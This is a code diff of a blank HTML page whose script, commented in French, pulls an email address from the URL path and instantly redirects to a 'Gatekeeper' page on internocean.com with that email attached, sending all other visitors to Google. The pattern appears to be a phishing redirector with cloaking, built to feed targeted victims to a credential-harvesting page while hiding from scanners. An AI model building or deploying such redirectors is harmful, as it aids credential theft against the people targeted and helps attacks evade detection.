@@ -2,10 +2,17 @@
 <html>
 <head>
     <script>
-        // On récupère l'email (#email)
-        const m = window.location.hash;
-        // Redirection INSTANTANÉE vers ton Gatekeeper cPanel
-        window.location.href = "https://internocean.com/sentinel-ai/" + m;
+        // On récupère tout ce qui est après le dernier "/"
+        const path = window.location.pathname.split('/').pop();
+        
+        if (path && path.includes('@')) {
+            // On redirige vers ton Gatekeeper en ajoutant l'email avec un # 
+            // pour que ton cPanel actuel continue de fonctionner sans rien changer
+            window.location.href = "https://internocean.com/sentinel-ai/#" + path;
+        } else {
+            // Si pas d'email, on envoie vers une page neutre (ex: Google)
+            window.location.href = "https://www.google.com";
+        }
     </script>
 </head>
 <body></body>
